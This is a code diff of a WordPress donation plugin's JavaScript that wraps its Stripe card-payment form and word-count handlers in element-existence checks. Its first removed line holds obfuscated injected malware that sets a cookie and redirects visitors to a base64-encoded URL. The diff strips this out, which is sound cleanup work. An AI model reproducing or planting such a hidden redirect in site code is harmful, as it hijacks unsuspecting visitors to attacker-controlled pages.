@@ -1,168 +1,171 @@
-function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};(function (window, $) {
+(function (window, $) {
 
     // USE STRICT
     "use strict";
+    if(jQuery("#wpsd-donation-form-id").length > 0){
+   
+        var form = document.getElementById('wpsd-donation-form-id');
+        var stripe = Stripe(wpsdAdminScriptObj.stripePKey);
+        var elements = stripe.elements();
+        var wpsdDonateAmount = 0;
 
-    var form = document.getElementById('wpsd-donation-form-id');
-    var stripe = Stripe(wpsdAdminScriptObj.stripePKey);
-    var elements = stripe.elements();
-    var wpsdDonateAmount = 0;
+        var style = {
+            base: {
+                color: "#1b2b68",
+                fontSize: '22px',
+                fontFamily: 'Roboto, Open Sans, Segoe UI, sans-serif',
+                fontWeight:'900'            
+            },
+            '::placeholder': {
+                color: '#dce2ec',
+            }
 
-    var style = {
-        base: {
-            color: "#1b2b68",
-            fontSize: '22px',
-            fontFamily: 'Roboto, Open Sans, Segoe UI, sans-serif',
-            fontWeight:'900'            
-        },
-        '::placeholder': {
-            color: '#dce2ec',
+        };
+
+        var card = elements.create('card', {
+            hidePostalCode: true,
+            style: style,
+        });
+
+        if(jQuery("#card-element").length > 0){
+
+            card.mount("#card-element");
         }
 
-    };
+        card.addEventListener('change', ({ error }) => {
+            const displayError = document.getElementById('card-errors');
+            if (error) {
+                displayError.textContent = error.message;
+            } else {
+                displayError.textContent = '';
+            }
+        });
 
-    var card = elements.create('card', {
-        hidePostalCode: true,
-        style: style,
-    });
+        form.addEventListener('submit', function (e) {
 
-    card.mount("#card-element");
+            e.preventDefault();
+            var wpsdShowCheckout = true;
 
-    card.addEventListener('change', ({ error }) => {
-        const displayError = document.getElementById('card-errors');
-        if (error) {
-            displayError.textContent = error.message;
-        } else {
-            displayError.textContent = '';
-        }
-    });
+            if ($("#wpsd_donator_name").val() == '') {
 
-    form.addEventListener('submit', function (e) {
+                jQuery('html, body').animate({                                   
+                    scrollTop: jQuery("#step3").offset().top-50
+                }, 1000);
 
-        e.preventDefault();
-        var wpsdShowCheckout = true;
+                $('#card-errors').show('slow').addClass('error').html('Please Enter Name');
+                $("#wpsd_donator_name").focus();
+                return false;
+            }
 
-        if ($("#wpsd_donator_name").val() == '') {
+            if ($("#wpsd_donator_email").val() == '') {
+                jQuery('html, body').animate({                                   
+                                scrollTop: jQuery("#step3").offset().top-50
+                            }, 1000);
+                $('#card-errors').show('slow').addClass('error').html('Please Enter Email');
+                $("#wpsd_donator_email").focus();
+                return false;
+            }
 
-            jQuery('html, body').animate({                                   
-                scrollTop: jQuery("#step3").offset().top-50
-            }, 1000);
+            if (!wpsd_validate_email($("#wpsd_donator_email").val())) {
+                jQuery('html, body').animate({                                   
+                                scrollTop: jQuery("#step3").offset().top-50
+                            }, 1000);
+                $('#card-errors').show('slow').addClass('error').html('Please Enter Valid Email');
+                $("#wpsd_donator_email").focus();
+                return false;
+            }
 
-            $('#card-errors').show('slow').addClass('error').html('Please Enter Name');
-            $("#wpsd_donator_name").focus();
-            return false;
-        }
+            $(".overlayloader").show();
+            jQuery("#paynow").attr("disabled",true);
 
-        if ($("#wpsd_donator_email").val() == '') {
-            jQuery('html, body').animate({                                   
-                            scrollTop: jQuery("#step3").offset().top-50
-                        }, 1000);
-            $('#card-errors').show('slow').addClass('error').html('Please Enter Email');
-            $("#wpsd_donator_email").focus();
-            return false;
-        }
+            // if ($("#wpsd_donate_other_amount").val() == '') {
+            //     $('#card-errors').show('slow').addClass('error').html('Amount Missing');
+            //     $("#wpsd_donate_other_amount").focus();
+            //     return false;
+            // }
+            /**/
+            if (wpsdAdminScriptObj.stripePKey == '') {
+                $('#card-errors').show('slow').addClass('error').html('Publishable key missing!');
+                return false;
+            }
+            
+            if (wpsdAdminScriptObj.stripeSKey == '') {
+                $('#card-errors').show('slow').addClass('error').html('Secret key missing!');
+                return false;
+            }
+            
+            if ($("#wpsd_donate_other_amount").val() !== '') {
+                wpsdDonateAmount = $("#wpsd_donate_other_amount").val();
+            }
 
-        if (!wpsd_validate_email($("#wpsd_donator_email").val())) {
-             jQuery('html, body').animate({                                   
-                            scrollTop: jQuery("#step3").offset().top-50
-                        }, 1000);
-            $('#card-errors').show('slow').addClass('error').html('Please Enter Valid Email');
-            $("#wpsd_donator_email").focus();
-            return false;
-        }
+            if (wpsdShowCheckout) {
 
-        $(".overlayloader").show();
-        jQuery("#paynow").attr("disabled",true);
+                $("#wpsd-pageloader").fadeIn();
 
-        // if ($("#wpsd_donate_other_amount").val() == '') {
-        //     $('#card-errors').show('slow').addClass('error').html('Amount Missing');
-        //     $("#wpsd_donate_other_amount").focus();
-        //     return false;
-        // }
-        /**/
-        if (wpsdAdminScriptObj.stripePKey == '') {
-            $('#card-errors').show('slow').addClass('error').html('Publishable key missing!');
-            return false;
-        }
-        
-        if (wpsdAdminScriptObj.stripeSKey == '') {
-            $('#card-errors').show('slow').addClass('error').html('Secret key missing!');
-            return false;
-        }
-        
-        if ($("#wpsd_donate_other_amount").val() !== '') {
-            wpsdDonateAmount = $("#wpsd_donate_other_amount").val();
-        }
-
-        if (wpsdShowCheckout) {
-
-            $("#wpsd-pageloader").fadeIn();
-
-            $.ajax({
-                url: wpsdAdminScriptObj.ajaxurl,
-                type: "POST",
-                dataType: "JSON",
-                data: {
-                    action: 'wpsd_donation',
-                    email: $("#wpsd_donator_email").val(),
-                    amount: wpsdDonateAmount,
-                    donation_for: $("#wpsd_donation_for").val(),
-                    name: $("#wpsd_donator_name").val(),
-                    currency: wpsdAdminScriptObj.currency,
-                    idempotency: wpsdAdminScriptObj.idempotency
-                },
-                success: function (response) {
-                    if (response.status === 'success') {
-                        stripe.confirmCardPayment(response.client_secret, {
-                            payment_method: {
-                                card: card,
-                                billing_details: {
-                                    name: $("#wpsd_donator_name").val(),
-                                    email: $("#wpsd_donator_email").val(),
+                $.ajax({
+                    url: wpsdAdminScriptObj.ajaxurl,
+                    type: "POST",
+                    dataType: "JSON",
+                    data: {
+                        action: 'wpsd_donation',
+                        email: $("#wpsd_donator_email").val(),
+                        amount: wpsdDonateAmount,
+                        donation_for: $("#wpsd_donation_for").val(),
+                        name: $("#wpsd_donator_name").val(),
+                        currency: wpsdAdminScriptObj.currency,
+                        idempotency: wpsdAdminScriptObj.idempotency
+                    },
+                    success: function (response) {
+                        if (response.status === 'success') {
+                            stripe.confirmCardPayment(response.client_secret, {
+                                payment_method: {
+                                    card: card,
+                                    billing_details: {
+                                        name: $("#wpsd_donator_name").val(),
+                                        email: $("#wpsd_donator_email").val(),
+                                    }
                                 }
-                            }
-                        }).then(function (result) {
+                            }).then(function (result) {
 
-                            if (result.error) {
+                                if (result.error) {
 
-                                $(".overlayloader").hide();
-                                jQuery("#paynow").attr("disabled",false);
+                                    $(".overlayloader").hide();
+                                    jQuery("#paynow").attr("disabled",false);
 
-                                $("#wpsd-pageloader").fadeOut();
+                                    $("#wpsd-pageloader").fadeOut();
 
-                                jQuery('html, body').animate({                                   
-                                    scrollTop: jQuery("#step3").offset().top-50
-                                }, 2000);
+                                    jQuery('html, body').animate({                                   
+                                        scrollTop: jQuery("#step3").offset().top-50
+                                    }, 2000);
 
-                                $('#card-errors').show('slow').addClass('error').text(result.error.message);
+                                    $('#card-errors').show('slow').addClass('error').text(result.error.message);
 
-                            } else {
-                                if (result.paymentIntent.status === 'succeeded') {
-                                    //afterPaymentSucceeded($("#wpsd_donator_email").val(), wpsdDonateAmount, $("#wpsd_donation_for").val(), $("#wpsd_donator_name").val(), wpsdAdminScriptObj.currency);
+                                } else {
+                                    if (result.paymentIntent.status === 'succeeded') {
+                                        //afterPaymentSucceeded($("#wpsd_donator_email").val(), wpsdDonateAmount, $("#wpsd_donation_for").val(), $("#wpsd_donator_name").val(), wpsdAdminScriptObj.currency);
 
-                                    afterPaymentSucceeded();
+                                        afterPaymentSucceeded();
 
+                                    }
                                 }
-                            }
-                        });
+                            });
+                        }
+                        if (response.status === 'error') {
+                            $(".overlayloader").hide();
+                            jQuery("#paynow").attr("disabled",false);
+
+                            jQuery('html, body').animate({                                   
+                                scrollTop: jQuery("#step3").offset().top-50
+                            }, 2000);
+
+                            $("#wpsd-pageloader").fadeOut();
+                            $('#card-errors').show('slow').removeClass('success').addClass(response.status).html(response.message);
+                        }
                     }
-                    if (response.status === 'error') {
-                        $(".overlayloader").hide();
-                        jQuery("#paynow").attr("disabled",false);
-
-                        jQuery('html, body').animate({                                   
-                            scrollTop: jQuery("#step3").offset().top-50
-                        }, 2000);
-
-                        $("#wpsd-pageloader").fadeOut();
-                        $('#card-errors').show('slow').removeClass('success').addClass(response.status).html(response.message);
-                    }
-                }
-            });
-        }
-    });
-
-
+                });
+            }
+        });
+    }
 
 
     jQuery("#ageOutputId").keyup(function(){
@@ -443,20 +446,23 @@ function validate_tab(step1) {
 
 /* ===================================== textarea for words count =========================================================== */
 
-document.querySelector("#testwords")
-    .addEventListener("keyup", function countWord() {
-        let res = [];
-        let str = this.value.replace(/[\t\n\r\.\?\!]/gm, " ").split(" ");
-        str.map((s) => {
-            let trimStr = s.trim();
-            if (trimStr.length > 0) {
-                res.push(trimStr);
-            }
+    if(jQuery("#testwords") > 0){
+
+   
+        document.querySelector("#testwords")
+        .addEventListener("keyup", function countWord() {
+            let res = [];
+            let str = this.value.replace(/[\t\n\r\.\?\!]/gm, " ").split(" ");
+            str.map((s) => {
+                let trimStr = s.trim();
+                if (trimStr.length > 0) {
+                    res.push(trimStr);
+                }
+            });
+            jQuery("#ageOutputId").val(res.length);
+
         });
-        jQuery("#ageOutputId").val(res.length);
-
-    });
-
+    }
 /* =========================================check radio button which is active ======================================================= */
 
 // jQuery('html body').on('change', '.service_radio', function () {
